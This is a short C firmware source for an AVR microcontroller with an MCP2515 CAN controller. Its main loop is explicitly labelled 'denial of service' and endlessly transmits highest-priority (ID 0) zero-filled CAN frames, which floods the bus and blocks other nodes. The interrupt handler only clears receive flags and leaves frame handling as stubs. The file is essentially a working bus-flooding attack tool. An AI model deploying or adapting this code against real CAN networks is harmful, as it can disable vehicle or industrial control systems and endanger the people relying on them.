#include <util/delay.h>
#include <stdio.h>
#include <avr/interrupt.h>
#include <inttypes.h>
#include <avr/pgmspace.h>

#include "mcp2515.h"
#include "mcp2515_defs.h"
#include "spi.h"

int main(void)
{
	/* INT0, low level */
	EIMSK = _BV(INT0);

	mcp2515_init();

	sei();

	/* denial of service */
	const uint8_t send_v[8] = {0};
	for (;;) {
		while (can_tx_busy())
			;
		can_send(can_std_id(0), sizeof(send_v)/sizeof(send_v[0]), send_v);
	}

	return 0;
}

ISR(INT0_vect)
{
	uint8_t canintf;

	MCP2515_enable;

	spi_wrrd(MCP2515_READ);
	spi_wrrd(MCP2515_CANINTF);
	canintf = spi_wrrd(0);

	MCP2515_disable;

	if (canintf & MCP2515_CANINTF_RX0IF) {
		can_rxh(0);
		/* handle can frame */
	}
	if (canintf & MCP2515_CANINTF_RX1IF) {
		can_rxh(1);
		/* handle can frame */
	}

	/* reset interrupt flags */
	mcp2515_perform(MCP2515_WRITE, MCP2515_CANINTF,
	        0x00,
	        0x00);
}
